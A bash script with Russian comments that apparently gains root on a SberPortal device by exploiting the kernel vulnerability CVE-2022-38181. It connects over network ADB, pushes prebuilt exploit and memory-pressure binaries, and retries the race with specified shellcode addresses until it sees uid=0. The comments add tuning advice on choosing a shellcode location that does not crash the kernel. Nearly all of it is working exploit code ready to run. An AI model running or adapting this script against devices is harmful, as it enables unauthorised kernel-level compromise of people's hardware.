#!/usr/bin/env bash
# SberPortal root (CVE-2022-38181). Авто-повтор до успеха.
# usage: getroot.sh <DEVICE_IP> [max_attempts]
# Env: HOG=<MB> (по умолчанию 900), SP_FUNC/SP_FUNC_ABS — холст шелл-кода.
#
# ВАЖНО: холст по умолчанию у VERIFY=13 — __alloc_page_frag (0x162f50). Это
# горячий сетевой путь: пока в нём лежит шелл-код, любой пакет вызывает его с
# мусорными аргументами и роняет ядро. Поэтому передаём vmalloc.
set -u
IP=${1:?usage: getroot.sh <device-ip> [max_attempts]}
N=${2:-30}
HOG=${HOG:-900}
FUNC=${SP_FUNC:-0x19bbf0}
FABS=${SP_FUNC_ABS:-0xffffff800921bbf0}
D="$IP:5555"
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)

say() { printf '%s\n' "$*"; }

adb connect "$D" >/dev/null 2>&1
if [ "$(adb -s "$D" get-state 2>/dev/null)" != "device" ]; then
  say "Устройство $D не в состоянии 'device'. Проверь adb connect / включён ли ADB."; exit 2
fi

say ">> раскладываю, включаю давление на память (hog ${HOG}MB)..."
adb -s "$D" push "$ROOT/prebuilt/raven_sber" /data/local/tmp/raven_sber >/dev/null 2>&1
adb -s "$D" push "$ROOT/prebuilt/hog"        /data/local/tmp/hog        >/dev/null 2>&1
adb -s "$D" shell "chmod 755 /data/local/tmp/raven_sber /data/local/tmp/hog" >/dev/null 2>&1
adb -s "$D" shell "nohup /data/local/tmp/hog $HOG >/dev/null 2>&1 &" >/dev/null 2>&1

for i in $(seq 1 "$N"); do
  adb connect "$D" >/dev/null 2>&1
  if [ "$(adb -s "$D" get-state 2>/dev/null)" != "device" ]; then
    say "[$i] устройство offline — передёрни питание SberPortal и подожди..."; sleep 30; continue
  fi
  adb -s "$D" shell "pidof hog >/dev/null || (nohup /data/local/tmp/hog $HOG >/dev/null 2>&1 &)" >/dev/null 2>&1
  adb -s "$D" shell "rm -f /data/local/tmp/root.log; cd /data/local/tmp && timeout 120 env RAVEN_VERIFY=13 SP_FUNC=$FUNC SP_FUNC_ABS=$FABS ./raven_sber > /data/local/tmp/root.log 2>&1" >/dev/null 2>&1
  if adb -s "$D" shell "grep -qa 'uid=0 euid=0' /data/local/tmp/root.log" 2>/dev/null; then
    say ">>> ROOT получен (попытка $i)"
    adb -s "$D" shell "grep -aE 'ret=|Permissive|Enforcing' /data/local/tmp/root.log"
    say "Проверь сам: adb -s $D shell id   (нужно uid=0)"
    exit 0
  fi
  say "[$i] не повезло, пробую ещё"
done
say "Не получилось за $N попыток. Повтори запуск (гонка ~70–80% на попытку)."
exit 1
